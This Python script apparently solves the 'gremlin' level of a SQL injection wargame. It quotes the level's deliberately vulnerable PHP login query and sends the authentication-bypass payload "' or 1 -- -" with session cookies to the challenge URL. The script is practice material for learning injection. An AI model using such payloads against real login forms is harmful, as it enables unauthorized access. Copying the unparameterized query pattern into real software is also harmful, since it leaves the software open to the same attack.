#!/usr/bin/env python3
import los


def main():
    '''
    Gremlin

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']) solve("gremlin");
    '''

    url = "https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php"
    cook = los.check_cookies(url)

    param = dict(id="' or 1 -- -")

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('GREMLIN Clear!')


if __name__ == '__main__':
    main()
